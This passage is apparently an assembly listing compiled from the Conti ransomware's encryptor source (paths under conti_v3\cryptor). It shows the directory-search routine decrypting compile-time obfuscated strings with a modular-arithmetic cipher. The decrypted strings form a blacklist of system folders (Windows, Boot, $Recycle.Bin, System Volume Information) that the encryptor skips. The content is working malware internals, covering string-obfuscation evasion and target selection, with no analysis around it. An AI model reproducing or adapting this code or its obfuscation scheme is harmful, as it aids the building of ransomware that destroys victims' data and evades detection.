  002ae	c1 e8 1f	 shr	 eax, 31
  002b1	03 d0		 add	 edx, eax
  002b3	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  002b6	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  002b9	46 88 44 0c 61	 mov	 BYTE PTR $T4[rsp+r9+1], r8b
  002be	49 ff c1	 inc	 r9
  002c1	49 83 f9 0c	 cmp	 r9, 12
  002c5	72 ab		 jb	 SHORT $LL140@CheckDirec
$LN139@CheckDirec:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 48   : 		OBFW(L"thumb"),

  002c7	48 8d 44 24 61	 lea	 rax, QWORD PTR $T4[rsp+1]
  002cc	48 89 45 58	 mov	 QWORD PTR BlackList$[rbp-232], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  002d0	88 5d c0	 mov	 BYTE PTR $T5[rbp-256], bl
  002d3	c6 45 c1 50	 mov	 BYTE PTR $T5[rbp-255], 80 ; 00000050H
  002d7	c6 45 c2 40	 mov	 BYTE PTR $T5[rbp-254], 64 ; 00000040H
  002db	c6 45 c3 2c	 mov	 BYTE PTR $T5[rbp-253], 44 ; 0000002cH
  002df	c6 45 c4 40	 mov	 BYTE PTR $T5[rbp-252], 64 ; 00000040H
  002e3	c6 45 c5 7b	 mov	 BYTE PTR $T5[rbp-251], 123 ; 0000007bH
  002e7	c6 45 c6 40	 mov	 BYTE PTR $T5[rbp-250], 64 ; 00000040H
  002eb	c6 45 c7 6c	 mov	 BYTE PTR $T5[rbp-249], 108 ; 0000006cH
  002ef	c6 45 c8 40	 mov	 BYTE PTR $T5[rbp-248], 64 ; 00000040H
  002f3	c6 45 c9 13	 mov	 BYTE PTR $T5[rbp-247], 19
  002f7	c6 45 ca 40	 mov	 BYTE PTR $T5[rbp-246], 64 ; 00000040H
  002fb	c6 45 cb 6c	 mov	 BYTE PTR $T5[rbp-245], 108 ; 0000006cH
  002ff	c6 45 cc 40	 mov	 BYTE PTR $T5[rbp-244], 64 ; 00000040H
  00303	c6 45 cd 70	 mov	 BYTE PTR $T5[rbp-243], 112 ; 00000070H
  00307	c6 45 ce 40	 mov	 BYTE PTR $T5[rbp-242], 64 ; 00000040H
  0030b	c6 45 cf 7b	 mov	 BYTE PTR $T5[rbp-241], 123 ; 0000007bH
  0030f	c6 45 d0 40	 mov	 BYTE PTR $T5[rbp-240], 64 ; 00000040H
  00313	c6 45 d1 1c	 mov	 BYTE PTR $T5[rbp-239], 28
  00317	c6 45 d2 40	 mov	 BYTE PTR $T5[rbp-238], 64 ; 00000040H
  0031b	c6 45 d3 33	 mov	 BYTE PTR $T5[rbp-237], 51 ; 00000033H
  0031f	c6 45 d4 40	 mov	 BYTE PTR $T5[rbp-236], 64 ; 00000040H
  00323	c6 45 d5 1a	 mov	 BYTE PTR $T5[rbp-235], 26
  00327	c6 45 d6 40	 mov	 BYTE PTR $T5[rbp-234], 64 ; 00000040H
  0032b	88 5d d7	 mov	 BYTE PTR $T5[rbp-233], bl
  0032e	c6 45 d8 40	 mov	 BYTE PTR $T5[rbp-232], 64 ; 00000040H
  00332	c6 45 d9 40	 mov	 BYTE PTR $T5[rbp-231], 64 ; 00000040H
  00336	c6 45 da 40	 mov	 BYTE PTR $T5[rbp-230], 64 ; 00000040H
  0033a	0f b6 45 c1	 movzx	 eax, BYTE PTR $T5[rbp-255]

; 58   :         return m_isDecrypted;

  0033e	0f b6 45 c0	 movzx	 eax, BYTE PTR $T5[rbp-256]

; 63   :         if (!isDecrypted())

  00342	84 c0		 test	 al, al
  00344	75 5f		 jne	 SHORT $LN205@CheckDirec

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00346	4c 8b cb	 mov	 r9, rbx
  00349	0f 1f 80 00 00
	00 00		 npad	 7
$LL206@CheckDirec:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00350	42 0f b6 4c 0d
	c1		 movzx	 ecx, BYTE PTR $T5[rbp+r9-255]

; 40   :     return (a % n + n) % n;

  00356	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0035b	83 e9 40	 sub	 ecx, 64			; 00000040H
  0035e	44 6b c1 22	 imul	 r8d, ecx, 34		; 00000022H

; 40   :     return (a % n + n) % n;

  00362	41 f7 e8	 imul	 r8d
  00365	41 03 d0	 add	 edx, r8d
  00368	c1 fa 06	 sar	 edx, 6
  0036b	8b c2		 mov	 eax, edx
  0036d	c1 e8 1f	 shr	 eax, 31
  00370	03 d0		 add	 edx, eax
  00372	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00375	44 2b c0	 sub	 r8d, eax
  00378	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0037d	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00381	41 f7 e8	 imul	 r8d
  00384	41 03 d0	 add	 edx, r8d
  00387	c1 fa 06	 sar	 edx, 6
  0038a	8b c2		 mov	 eax, edx
  0038c	c1 e8 1f	 shr	 eax, 31
  0038f	03 d0		 add	 edx, eax
  00391	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00394	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00397	46 88 44 0d c1	 mov	 BYTE PTR $T5[rbp+r9-255], r8b
  0039c	49 ff c1	 inc	 r9
  0039f	49 83 f9 1a	 cmp	 r9, 26
  003a3	72 ab		 jb	 SHORT $LL206@CheckDirec
$LN205@CheckDirec:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 49   : 		OBFW(L"$Recycle.Bin"),

  003a5	48 8d 45 c1	 lea	 rax, QWORD PTR $T5[rbp-255]
  003a9	48 89 45 60	 mov	 QWORD PTR BlackList$[rbp-224], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  003ad	88 5d e0	 mov	 BYTE PTR $T6[rbp-256], bl
  003b0	c6 45 e1 29	 mov	 BYTE PTR $T6[rbp-255], 41 ; 00000029H
  003b4	c6 45 e2 73	 mov	 BYTE PTR $T6[rbp-254], 115 ; 00000073H
  003b8	c6 45 e3 11	 mov	 BYTE PTR $T6[rbp-253], 17
  003bc	c6 45 e4 73	 mov	 BYTE PTR $T6[rbp-252], 115 ; 00000073H
  003c0	c6 45 e5 4f	 mov	 BYTE PTR $T6[rbp-251], 79 ; 0000004fH
  003c4	c6 45 e6 73	 mov	 BYTE PTR $T6[rbp-250], 115 ; 00000073H
  003c8	c6 45 e7 45	 mov	 BYTE PTR $T6[rbp-249], 69 ; 00000045H
  003cc	c6 45 e8 73	 mov	 BYTE PTR $T6[rbp-248], 115 ; 00000073H
  003d0	c6 45 e9 34	 mov	 BYTE PTR $T6[rbp-247], 52 ; 00000034H
  003d4	c6 45 ea 73	 mov	 BYTE PTR $T6[rbp-246], 115 ; 00000073H
  003d8	c6 45 eb 45	 mov	 BYTE PTR $T6[rbp-245], 69 ; 00000045H
  003dc	c6 45 ec 73	 mov	 BYTE PTR $T6[rbp-244], 115 ; 00000073H
  003e0	c6 45 ed 72	 mov	 BYTE PTR $T6[rbp-243], 114 ; 00000072H
  003e4	c6 45 ee 73	 mov	 BYTE PTR $T6[rbp-242], 115 ; 00000073H
  003e8	c6 45 ef 4f	 mov	 BYTE PTR $T6[rbp-241], 79 ; 0000004fH
  003ec	c6 45 f0 73	 mov	 BYTE PTR $T6[rbp-240], 115 ; 00000073H
  003f0	c6 45 f1 5b	 mov	 BYTE PTR $T6[rbp-239], 91 ; 0000005bH
  003f4	c6 45 f2 73	 mov	 BYTE PTR $T6[rbp-238], 115 ; 00000073H
  003f8	c6 45 f3 40	 mov	 BYTE PTR $T6[rbp-237], 64 ; 00000040H
  003fc	c6 45 f4 73	 mov	 BYTE PTR $T6[rbp-236], 115 ; 00000073H
  00400	c6 45 f5 63	 mov	 BYTE PTR $T6[rbp-235], 99 ; 00000063H
  00404	c6 45 f6 73	 mov	 BYTE PTR $T6[rbp-234], 115 ; 00000073H
  00408	c6 45 f7 7c	 mov	 BYTE PTR $T6[rbp-233], 124 ; 0000007cH
  0040c	c6 45 f8 73	 mov	 BYTE PTR $T6[rbp-232], 115 ; 00000073H
  00410	c6 45 f9 73	 mov	 BYTE PTR $T6[rbp-231], 115 ; 00000073H
  00414	c6 45 fa 73	 mov	 BYTE PTR $T6[rbp-230], 115 ; 00000073H
  00418	0f b6 45 e1	 movzx	 eax, BYTE PTR $T6[rbp-255]

; 58   :         return m_isDecrypted;

  0041c	0f b6 45 e0	 movzx	 eax, BYTE PTR $T6[rbp-256]

; 63   :         if (!isDecrypted())

  00420	84 c0		 test	 al, al
  00422	75 61		 jne	 SHORT $LN271@CheckDirec

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00424	4c 8b cb	 mov	 r9, rbx
  00427	66 0f 1f 84 00
	00 00 00 00	 npad	 9
$LL272@CheckDirec:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00430	42 0f b6 4c 0d
	e1		 movzx	 ecx, BYTE PTR $T6[rbp+r9-255]

; 40   :     return (a % n + n) % n;

  00436	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0043b	83 e9 73	 sub	 ecx, 115		; 00000073H
  0043e	44 6b c1 33	 imul	 r8d, ecx, 51		; 00000033H

; 40   :     return (a % n + n) % n;

  00442	41 f7 e8	 imul	 r8d
  00445	41 03 d0	 add	 edx, r8d
  00448	c1 fa 06	 sar	 edx, 6
  0044b	8b c2		 mov	 eax, edx
  0044d	c1 e8 1f	 shr	 eax, 31
  00450	03 d0		 add	 edx, eax
  00452	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00455	44 2b c0	 sub	 r8d, eax
  00458	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0045d	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00461	41 f7 e8	 imul	 r8d
  00464	41 03 d0	 add	 edx, r8d
  00467	c1 fa 06	 sar	 edx, 6
  0046a	8b c2		 mov	 eax, edx
  0046c	c1 e8 1f	 shr	 eax, 31
  0046f	03 d0		 add	 edx, eax
  00471	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00474	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00477	46 88 44 0d e1	 mov	 BYTE PTR $T6[rbp+r9-255], r8b
  0047c	49 ff c1	 inc	 r9
  0047f	49 83 f9 1a	 cmp	 r9, 26
  00483	72 ab		 jb	 SHORT $LL272@CheckDirec
$LN271@CheckDirec:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 50   : 		OBFW(L"$RECYCLE.BIN"),

  00485	48 8d 45 e1	 lea	 rax, QWORD PTR $T6[rbp-255]
  00489	48 89 45 68	 mov	 QWORD PTR BlackList$[rbp-216], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0048d	88 5d 00	 mov	 BYTE PTR $T7[rbp-256], bl
  00490	c6 45 01 45	 mov	 BYTE PTR $T7[rbp-255], 69 ; 00000045H
  00494	c6 45 02 44	 mov	 BYTE PTR $T7[rbp-254], 68 ; 00000044H
  00498	c6 45 03 61	 mov	 BYTE PTR $T7[rbp-253], 97 ; 00000061H
  0049c	c6 45 04 44	 mov	 BYTE PTR $T7[rbp-252], 68 ; 00000044H
  004a0	c6 45 05 7e	 mov	 BYTE PTR $T7[rbp-251], 126 ; 0000007eH
  004a4	c6 45 06 44	 mov	 BYTE PTR $T7[rbp-250], 68 ; 00000044H
  004a8	c6 45 07 64	 mov	 BYTE PTR $T7[rbp-249], 100 ; 00000064H
  004ac	c6 45 08 44	 mov	 BYTE PTR $T7[rbp-248], 68 ; 00000044H
  004b0	c6 45 09 6d	 mov	 BYTE PTR $T7[rbp-247], 109 ; 0000006dH
  004b4	c6 45 0a 44	 mov	 BYTE PTR $T7[rbp-246], 68 ; 00000044H
  004b8	c6 45 0b 1c	 mov	 BYTE PTR $T7[rbp-245], 28
  004bc	c6 45 0c 44	 mov	 BYTE PTR $T7[rbp-244], 68 ; 00000044H
  004c0	c6 45 0d 7d	 mov	 BYTE PTR $T7[rbp-243], 125 ; 0000007dH
  004c4	c6 45 0e 44	 mov	 BYTE PTR $T7[rbp-242], 68 ; 00000044H
  004c8	c6 45 0f 76	 mov	 BYTE PTR $T7[rbp-241], 118 ; 00000076H
  004cc	c6 45 10 44	 mov	 BYTE PTR $T7[rbp-240], 68 ; 00000044H
  004d0	c6 45 11 67	 mov	 BYTE PTR $T7[rbp-239], 103 ; 00000067H
  004d4	c6 45 12 44	 mov	 BYTE PTR $T7[rbp-238], 68 ; 00000044H
  004d8	c6 45 13 36	 mov	 BYTE PTR $T7[rbp-237], 54 ; 00000036H
  004dc	c6 45 14 44	 mov	 BYTE PTR $T7[rbp-236], 68 ; 00000044H
  004e0	c6 45 15 4a	 mov	 BYTE PTR $T7[rbp-235], 74 ; 0000004aH
  004e4	c6 45 16 44	 mov	 BYTE PTR $T7[rbp-234], 68 ; 00000044H
  004e8	c6 45 17 1c	 mov	 BYTE PTR $T7[rbp-233], 28
  004ec	c6 45 18 44	 mov	 BYTE PTR $T7[rbp-232], 68 ; 00000044H
  004f0	c6 45 19 6d	 mov	 BYTE PTR $T7[rbp-231], 109 ; 0000006dH
  004f4	c6 45 1a 44	 mov	 BYTE PTR $T7[rbp-230], 68 ; 00000044H
  004f8	c6 45 1b 7d	 mov	 BYTE PTR $T7[rbp-229], 125 ; 0000007dH
  004fc	c6 45 1c 44	 mov	 BYTE PTR $T7[rbp-228], 68 ; 00000044H
  00500	c6 45 1d 4b	 mov	 BYTE PTR $T7[rbp-227], 75 ; 0000004bH
  00504	c6 45 1e 44	 mov	 BYTE PTR $T7[rbp-226], 68 ; 00000044H
  00508	c6 45 1f 02	 mov	 BYTE PTR $T7[rbp-225], 2
  0050c	c6 45 20 44	 mov	 BYTE PTR $T7[rbp-224], 68 ; 00000044H
  00510	c6 45 21 53	 mov	 BYTE PTR $T7[rbp-223], 83 ; 00000053H
  00514	c6 45 22 44	 mov	 BYTE PTR $T7[rbp-222], 68 ; 00000044H
  00518	c6 45 23 67	 mov	 BYTE PTR $T7[rbp-221], 103 ; 00000067H
  0051c	c6 45 24 44	 mov	 BYTE PTR $T7[rbp-220], 68 ; 00000044H
  00520	c6 45 25 19	 mov	 BYTE PTR $T7[rbp-219], 25
  00524	c6 45 26 44	 mov	 BYTE PTR $T7[rbp-218], 68 ; 00000044H
  00528	c6 45 27 1c	 mov	 BYTE PTR $T7[rbp-217], 28
  0052c	c6 45 28 44	 mov	 BYTE PTR $T7[rbp-216], 68 ; 00000044H
  00530	c6 45 29 56	 mov	 BYTE PTR $T7[rbp-215], 86 ; 00000056H
  00534	c6 45 2a 44	 mov	 BYTE PTR $T7[rbp-214], 68 ; 00000044H
  00538	c6 45 2b 64	 mov	 BYTE PTR $T7[rbp-213], 100 ; 00000064H
  0053c	c6 45 2c 44	 mov	 BYTE PTR $T7[rbp-212], 68 ; 00000044H
  00540	c6 45 2d 05	 mov	 BYTE PTR $T7[rbp-211], 5
  00544	c6 45 2e 44	 mov	 BYTE PTR $T7[rbp-210], 68 ; 00000044H
  00548	c6 45 2f 67	 mov	 BYTE PTR $T7[rbp-209], 103 ; 00000067H
  0054c	c6 45 30 44	 mov	 BYTE PTR $T7[rbp-208], 68 ; 00000044H
  00550	c6 45 31 02	 mov	 BYTE PTR $T7[rbp-207], 2
  00554	c6 45 32 44	 mov	 BYTE PTR $T7[rbp-206], 68 ; 00000044H
  00558	c6 45 33 44	 mov	 BYTE PTR $T7[rbp-205], 68 ; 00000044H
  0055c	c6 45 34 44	 mov	 BYTE PTR $T7[rbp-204], 68 ; 00000044H
  00560	0f b6 45 01	 movzx	 eax, BYTE PTR $T7[rbp-255]

; 58   :         return m_isDecrypted;

  00564	0f b6 45 00	 movzx	 eax, BYTE PTR $T7[rbp-256]

; 63   :         if (!isDecrypted())

  00568	84 c0		 test	 al, al
  0056a	75 55		 jne	 SHORT $LN389@CheckDirec

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0056c	4c 8b c3	 mov	 r8, rbx
  0056f	90		 npad	 1
$LL390@CheckDirec:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00570	42 0f b6 4c 05
	01		 movzx	 ecx, BYTE PTR $T7[rbp+r8-255]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00576	b8 44 00 00 00	 mov	 eax, 68			; 00000044H
  0057b	2b c1		 sub	 eax, ecx
  0057d	6b c8 2c	 imul	 ecx, eax, 44		; 0000002cH

; 40   :     return (a % n + n) % n;

  00580	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00585	f7 e9		 imul	 ecx
  00587	03 d1		 add	 edx, ecx
  00589	c1 fa 06	 sar	 edx, 6
  0058c	8b c2		 mov	 eax, edx
  0058e	c1 e8 1f	 shr	 eax, 31
  00591	03 d0		 add	 edx, eax
  00593	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00596	2b c8		 sub	 ecx, eax
  00598	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0059d	83 c1 7f	 add	 ecx, 127		; 0000007fH
  005a0	f7 e9		 imul	 ecx
  005a2	03 d1		 add	 edx, ecx
  005a4	c1 fa 06	 sar	 edx, 6
  005a7	8b c2		 mov	 eax, edx
  005a9	c1 e8 1f	 shr	 eax, 31
  005ac	03 d0		 add	 edx, eax
  005ae	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  005b1	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  005b3	42 88 4c 05 01	 mov	 BYTE PTR $T7[rbp+r8-255], cl
  005b8	49 ff c0	 inc	 r8
  005bb	49 83 f8 34	 cmp	 r8, 52			; 00000034H
  005bf	72 af		 jb	 SHORT $LL390@CheckDirec
$LN389@CheckDirec:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 51   : 		OBFW(L"System Volume Information"),

  005c1	48 8d 45 01	 lea	 rax, QWORD PTR $T7[rbp-255]
  005c5	48 89 45 70	 mov	 QWORD PTR BlackList$[rbp-208], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  005c9	88 5c 24 40	 mov	 BYTE PTR $T8[rsp], bl
  005cd	c6 44 24 41 2e	 mov	 BYTE PTR $T8[rsp+1], 46	; 0000002eH
  005d2	c6 44 24 42 5b	 mov	 BYTE PTR $T8[rsp+2], 91	; 0000005bH
  005d7	c6 44 24 43 7d	 mov	 BYTE PTR $T8[rsp+3], 125 ; 0000007dH
  005dc	c6 44 24 44 5b	 mov	 BYTE PTR $T8[rsp+4], 91	; 0000005bH
  005e1	c6 44 24 45 7d	 mov	 BYTE PTR $T8[rsp+5], 125 ; 0000007dH
  005e6	c6 44 24 46 5b	 mov	 BYTE PTR $T8[rsp+6], 91	; 0000005bH
  005eb	c6 44 24 47 23	 mov	 BYTE PTR $T8[rsp+7], 35	; 00000023H
  005f0	c6 44 24 48 5b	 mov	 BYTE PTR $T8[rsp+8], 91	; 0000005bH
  005f5	c6 44 24 49 5b	 mov	 BYTE PTR $T8[rsp+9], 91	; 0000005bH
  005fa	c6 44 24 4a 5b	 mov	 BYTE PTR $T8[rsp+10], 91 ; 0000005bH
  005ff	0f b6 44 24 41	 movzx	 eax, BYTE PTR $T8[rsp+1]

; 58   :         return m_isDecrypted;

  00604	0f b6 44 24 40	 movzx	 eax, BYTE PTR $T8[rsp]

; 63   :         if (!isDecrypted())

  00609	84 c0		 test	 al, al
  0060b	75 58		 jne	 SHORT $LN423@CheckDirec

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0060d	4c 8b cb	 mov	 r9, rbx
$LL424@CheckDirec:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00610	42 0f b6 4c 0c
	41		 movzx	 ecx, BYTE PTR $T8[rsp+r9+1]

; 40   :     return (a % n + n) % n;

  00616	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0061b	83 e9 5b	 sub	 ecx, 91			; 0000005bH
  0061e	44 6b c1 07	 imul	 r8d, ecx, 7

; 40   :     return (a % n + n) % n;

  00622	41 f7 e8	 imul	 r8d
  00625	41 03 d0	 add	 edx, r8d
  00628	c1 fa 06	 sar	 edx, 6
  0062b	8b c2		 mov	 eax, edx
  0062d	c1 e8 1f	 shr	 eax, 31
  00630	03 d0		 add	 edx, eax
  00632	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00635	44 2b c0	 sub	 r8d, eax
  00638	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0063d	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00641	41 f7 e8	 imul	 r8d
  00644	41 03 d0	 add	 edx, r8d
  00647	c1 fa 06	 sar	 edx, 6
  0064a	8b c2		 mov	 eax, edx
  0064c	c1 e8 1f	 shr	 eax, 31
  0064f	03 d0		 add	 edx, eax
  00651	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00654	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00657	46 88 44 0c 41	 mov	 BYTE PTR $T8[rsp+r9+1], r8b
  0065c	49 ff c1	 inc	 r9
  0065f	49 83 f9 0a	 cmp	 r9, 10
  00663	72 ab		 jb	 SHORT $LL424@CheckDirec
$LN423@CheckDirec:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 52   : 		OBFW(L"Boot"),

  00665	48 8d 44 24 41	 lea	 rax, QWORD PTR $T8[rsp+1]
  0066a	48 89 45 78	 mov	 QWORD PTR BlackList$[rbp-200], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0066e	88 5c 24 70	 mov	 BYTE PTR $T9[rsp], bl
  00672	c6 44 24 71 11	 mov	 BYTE PTR $T9[rsp+1], 17
  00677	c6 44 24 72 64	 mov	 BYTE PTR $T9[rsp+2], 100 ; 00000064H
  0067c	c6 44 24 73 30	 mov	 BYTE PTR $T9[rsp+3], 48	; 00000030H
  00681	c6 44 24 74 64	 mov	 BYTE PTR $T9[rsp+4], 100 ; 00000064H
  00686	c6 44 24 75 6a	 mov	 BYTE PTR $T9[rsp+5], 106 ; 0000006aH
  0068b	c6 44 24 76 64	 mov	 BYTE PTR $T9[rsp+6], 100 ; 00000064H
  00690	c6 44 24 77 75	 mov	 BYTE PTR $T9[rsp+7], 117 ; 00000075H
  00695	c6 44 24 78 64	 mov	 BYTE PTR $T9[rsp+8], 100 ; 00000064H
  0069a	c6 44 24 79 10	 mov	 BYTE PTR $T9[rsp+9], 16
  0069f	c6 44 24 7a 64	 mov	 BYTE PTR $T9[rsp+10], 100 ; 00000064H
  006a4	c6 44 24 7b 3a	 mov	 BYTE PTR $T9[rsp+11], 58 ; 0000003aH
  006a9	c6 44 24 7c 64	 mov	 BYTE PTR $T9[rsp+12], 100 ; 00000064H
  006ae	c6 44 24 7d 25	 mov	 BYTE PTR $T9[rsp+13], 37 ; 00000025H
  006b3	c6 44 24 7e 64	 mov	 BYTE PTR $T9[rsp+14], 100 ; 00000064H
  006b8	c6 44 24 7f 64	 mov	 BYTE PTR $T9[rsp+15], 100 ; 00000064H
  006bd	c6 45 80 64	 mov	 BYTE PTR $T9[rbp-240], 100 ; 00000064H
  006c1	0f b6 44 24 71	 movzx	 eax, BYTE PTR $T9[rsp+1]

; 58   :         return m_isDecrypted;

  006c6	0f b6 44 24 70	 movzx	 eax, BYTE PTR $T9[rsp]

; 63   :         if (!isDecrypted())

  006cb	84 c0		 test	 al, al
  006cd	75 65		 jne	 SHORT $LN469@CheckDirec

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  006cf	4c 8b c3	 mov	 r8, rbx
  006d2	0f 1f 40 00 66
	66 0f 1f 84 00
	00 00 00 00	 npad	 14
$LL470@CheckDirec:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  006e0	42 0f b6 4c 04
	71		 movzx	 ecx, BYTE PTR $T9[rsp+r8+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  006e6	b8 64 00 00 00	 mov	 eax, 100		; 00000064H
  006eb	2b c1		 sub	 eax, ecx
  006ed	8d 0c 40	 lea	 ecx, DWORD PTR [rax+rax*2]

; 40   :     return (a % n + n) % n;

  006f0	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  006f5	c1 e1 03	 shl	 ecx, 3

; 40   :     return (a % n + n) % n;

  006f8	f7 e9		 imul	 ecx
  006fa	03 d1		 add	 edx, ecx
  006fc	c1 fa 06	 sar	 edx, 6
  006ff	8b c2		 mov	 eax, edx
  00701	c1 e8 1f	 shr	 eax, 31
  00704	03 d0		 add	 edx, eax
  00706	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00709	2b c8		 sub	 ecx, eax
  0070b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00710	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00713	f7 e9		 imul	 ecx
  00715	03 d1		 add	 edx, ecx
  00717	c1 fa 06	 sar	 edx, 6
  0071a	8b c2		 mov	 eax, edx
  0071c	c1 e8 1f	 shr	 eax, 31
  0071f	03 d0		 add	 edx, eax
  00721	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00724	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00726	42 88 4c 04 71	 mov	 BYTE PTR $T9[rsp+r8+1], cl
  0072b	49 ff c0	 inc	 r8
  0072e	49 83 f8 10	 cmp	 r8, 16
  00732	72 ac		 jb	 SHORT $LL470@CheckDirec
$LN469@CheckDirec:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 53   : 		OBFW(L"Windows"),

  00734	48 8d 44 24 71	 lea	 rax, QWORD PTR $T9[rsp+1]
  00739	48 89 85 80 00
	00 00		 mov	 QWORD PTR BlackList$[rbp-192], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00740	88 5d a0	 mov	 BYTE PTR $T10[rbp-256], bl
  00743	c6 45 a1 2e	 mov	 BYTE PTR $T10[rbp-255], 46 ; 0000002eH
  00747	c6 45 a2 0b	 mov	 BYTE PTR $T10[rbp-254], 11
  0074b	c6 45 a3 7a	 mov	 BYTE PTR $T10[rbp-253], 122 ; 0000007aH
  0074f	c6 45 a4 0b	 mov	 BYTE PTR $T10[rbp-252], 11
  00753	c6 45 a5 6a	 mov	 BYTE PTR $T10[rbp-251], 106 ; 0000006aH
  00757	c6 45 a6 0b	 mov	 BYTE PTR $T10[rbp-250], 11
  0075b	c6 45 a7 4e	 mov	 BYTE PTR $T10[rbp-249], 78 ; 0000004eH
  0075f	c6 45 a8 0b	 mov	 BYTE PTR $T10[rbp-248], 11
  00763	c6 45 a9 5f	 mov	 BYTE PTR $T10[rbp-247], 95 ; 0000005fH
  00767	c6 45 aa 0b	 mov	 BYTE PTR $T10[rbp-246], 11
  0076b	c6 45 ab 6d	 mov	 BYTE PTR $T10[rbp-245], 109 ; 0000006dH
  0076f	c6 45 ac 0b	 mov	 BYTE PTR $T10[rbp-244], 11
  00773	c6 45 ad 60	 mov	 BYTE PTR $T10[rbp-243], 96 ; 00000060H
  00777	c6 45 ae 0b	 mov	 BYTE PTR $T10[rbp-242], 11
  0077b	c6 45 af 17	 mov	 BYTE PTR $T10[rbp-241], 23
  0077f	c6 45 b0 0b	 mov	 BYTE PTR $T10[rbp-240], 11
  00783	c6 45 b1 54	 mov	 BYTE PTR $T10[rbp-239], 84 ; 00000054H
  00787	c6 45 b2 0b	 mov	 BYTE PTR $T10[rbp-238], 11
  0078b	c6 45 b3 7a	 mov	 BYTE PTR $T10[rbp-237], 122 ; 0000007aH
  0078f	c6 45 b4 0b	 mov	 BYTE PTR $T10[rbp-236], 11
  00793	c6 45 b5 59	 mov	 BYTE PTR $T10[rbp-235], 89 ; 00000059H
  00797	c6 45 b6 0b	 mov	 BYTE PTR $T10[rbp-234], 11
  0079b	c6 45 b7 0b	 mov	 BYTE PTR $T10[rbp-233], 11
  0079f	c6 45 b8 0b	 mov	 BYTE PTR $T10[rbp-232], 11
  007a3	0f b6 45 a1	 movzx	 eax, BYTE PTR $T10[rbp-255]

; 58   :         return m_isDecrypted;

  007a7	0f b6 45 a0	 movzx	 eax, BYTE PTR $T10[rbp-256]

; 63   :         if (!isDecrypted())

  007ab	84 c0		 test	 al, al
  007ad	75 62		 jne	 SHORT $LN531@CheckDirec

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

